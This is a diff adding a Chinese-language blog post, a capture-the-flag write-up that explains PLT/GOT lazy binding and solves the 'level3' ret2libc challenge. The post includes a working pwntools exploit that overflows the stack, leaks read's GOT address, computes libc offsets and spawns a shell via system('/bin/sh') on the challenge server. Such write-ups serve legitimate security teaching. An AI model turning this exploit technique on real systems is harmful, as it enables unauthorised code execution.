@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="最近心血来潮突然想整理一道经典的ret2libc   废话不多说，直接开始 预备知识在gdb中disas我们会看到这样一项 1call 0x8048340 &lt;write@plt&gt; 这个&lt;write@plt&gt;实际并不是write的地址，只是一个过度的地址，这一项指向write在plt(Procedure Linkage Table)表中的地址，然后从plt表跳到got(Glo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道经典的ret2lib">
+<meta property="og:url" content="http://yoursite.com/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/index.html">
+<meta property="og:site_name" content="paxosHome">
+<meta property="og:description" content="最近心血来潮突然想整理一道经典的ret2libc   废话不多说，直接开始 预备知识在gdb中disas我们会看到这样一项 1call 0x8048340 &lt;write@plt&gt; 这个&lt;write@plt&gt;实际并不是write的地址，只是一个过度的地址，这一项指向write在plt(Procedure Linkage Table)表中的地址，然后从plt表跳到got(Glo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/JsmSVH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/JsKkxx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/JsQqGd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/JslfYQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/Js1tcn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/JsMS6P.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/25/JsJ1rn.png">
+<meta property="article:published_time" content="2020-04-25T04:20:34.000Z">
+<meta property="article:modified_time" content="2020-04-25T04:19:59.199Z">
+<meta property="article:author" content="Paxos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/04/25/JsmSVH.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/25/一道经典的ret2lib/"/>
+
+
+
+
+
+  <title>一道经典的ret2lib | paxosHome</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">paxosHome</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Paxos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="paxosHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一道经典的ret2lib</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-25T12:20:34+08:00">
+                2020-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><del>最近心血来潮突然想整理一道经典的ret2libc</del>  </p>
+<p><strong>废话不多说，直接开始</strong></p>
+<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>在gdb中disas我们会看到这样一项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 0x8048340 &lt;write@plt&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/04/25/JsmSVH.png" alt="avater"><br>这个<code>&lt;write@plt&gt;</code>实际并不是write的地址，只是一个过度的地址，这一项指向write在plt(Procedure Linkage Table)表中的地址，然后从plt表跳到got(Global Offset Table)表，最后在got表中的某一项拿到write的真正地址。这是一个多次跳转的过程。这是linux自身的一个运行时重定位的机制，简要来说，有一部分函数是在glibc中的。当程序启动后，glibc装载，而些需要的函数，在运行前实际上我们是不知道他的地址的，只有当真正运行起来，调用的时候才知道他真正的地址。<br>但这个时候又出现了一个问题，为什么我们不直接在运行时把<code>&lt;write@plt&gt;</code>替换成真正的write的地址呢，而是通过多次跳转找到真正的地址？这是因为，在现代操作系统中</p>
+<ul>
+<li>不允许修改代码段，只能修改数据段</li>
+<li>如果write函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</li>
+</ul>
+<p>基于这些问题，<strong>write的地址只能回写到数据段内，而不能回写在代码段上</strong>，所以我们引入got和plt表的原因就很清楚了：</p>
+<ul>
+<li>plt表存放一小段额外的代码，他的任务是向got表中函数对应的表项跳转以获取数据段存放的函数地址。</li>
+<li>got表可以看作一个存放函数地址的数据表，其中对应的表项存的是函数加载后真正的地址。请看简化后的图片：<br><img src="https://s1.ax1x.com/2020/04/25/JsKkxx.png" alt="avater2"><br>通过这个过程，我们就可以leak出函数真正的地址，然后加以利用。<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><img src="https://s1.ax1x.com/2020/04/25/JsQqGd.png" alt="avater4"><br>这个函数中调用了_read我们跟进去看一下<br><img src="https://s1.ax1x.com/2020/04/25/JslfYQ.png" alt="a"><br>我们最终到达了got表中的一个位置，这里解释一下<em>为什么有一个.got一个.got.plt</em></li>
+<li>ELF将GOT拆分为两个表，”.got”和”.got.plt”。其中”.got”用来保存全局变量引用的地址，“.got.plt”用来保存函数引用的地址，对于外部函数的引用全部放在”.got.plt”中。</li>
+</ul>
+<p>也就是说这个<code>dd offset read</code> 才是我们最终要到达的地址。其他函数同理。<br>当你再一次进入got中的read，达到了这样一个地方：<br><img src="https://s1.ax1x.com/2020/04/25/Js1tcn.png" alt="b"><br>这里就是真正的read的地址了。<br><em>需要注意的是，当你的函数第一次被调用时，会先将真实地址写入GOT表，然后直接跳转到真实的地址执行。而当你接下来再次进行调用时就是按照：func@plt –&gt; func@got –&gt; func跳转了</em></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序概览"><a href="#程序概览" class="headerlink" title="程序概览"></a>程序概览</h3><ul>
+<li>没有给我们bin/sh</li>
+<li>没有给我们system或exec族函数等</li>
+<li>提供so文件</li>
+<li>有明显的栈溢出漏洞<br><img src="https://s1.ax1x.com/2020/04/25/JsMS6P.png" alt="avater3"><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3></li>
+<li>从libc中拿到system和bin/sh的真实地址然后pwn<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">劫持read函数 ---&gt; </span><br><span class="line">返回write函数 ---&gt; </span><br><span class="line">设置write函数返回地址为vulnerable_function ---&gt; </span><br><span class="line">fd设1，标准输出 ---&gt; buff指向read函数在got表中的真正位置 ---&gt; </span><br><span class="line">泄漏read函数的真实地址 ---&gt;  </span><br><span class="line">计算read函数与libc中read的offset ---&gt; </span><br><span class="line">加上offset拿到真实的system函数地址和&#x2F;bin&#x2F;sh的地址 ---&gt; </span><br><span class="line">二次rop，再次劫持read ---&gt; </span><br><span class="line">返回到system函数 ---&gt; </span><br><span class="line">填充垃圾返回地址 ---&gt; 参数为bin&#x2F;sh的真实地址 ---&gt; pwn</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">    io = process(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="comment"># pattern = 'A'*(0x88+4)</span></span><br><span class="line">    write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write@plt: "</span>,hex(write_plt)</span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">    vulnerable = elf.symbols[<span class="string">'vulnerable_function'</span>]   <span class="comment"># 0x804844b</span></span><br><span class="line">    return_add = vulnerable</span><br><span class="line">    payload_leak = flat(cyclic(<span class="number">0x88</span>+<span class="number">4</span>),p32(write_plt),p32(return_add),p32(<span class="number">1</span>),p32(read_got),p32(<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">    io.send(payload_leak)</span><br><span class="line">    read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"real read_addr: "</span>,hex(read_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    offset = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">    system_addr = offset +  libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = offset + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"offset: "</span>,hex(offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"real system: "</span>,hex(system_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read string: "</span>,hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">    rop = flat(</span><br><span class="line">                cyclic(<span class="number">0x88</span>+<span class="number">4</span>),p32(system_addr),cyclic(<span class="number">4</span>),p32(bin_sh_addr)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">"Input:\n"</span>, rop)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://s1.ax1x.com/2020/04/25/JsJ1rn.png" alt="a"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/03/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%B7%E6%87%92%E5%AD%A6%E4%B9%A0%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/" rel="next" title="从一次偷懒学习内联汇编">
+                <i class="fa fa-chevron-left"></i> 从一次偷懒学习内联汇编
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4"
+               alt="Paxos" />
+          <p class="site-author-name" itemprop="name">Paxos</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/OrangeGzY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:guoziyi114@gmail.com" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预备知识"><span class="nav-number">1.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#举例"><span class="nav-number">2.</span> <span class="nav-text">举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序概览"><span class="nav-number">3.1.</span> <span class="nav-text">程序概览</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击目标"><span class="nav-number">3.2.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击过程"><span class="nav-number">3.3.</span> <span class="nav-text">攻击过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结果"><span class="nav-number">3.5.</span> <span class="nav-text">结果</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paxos</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
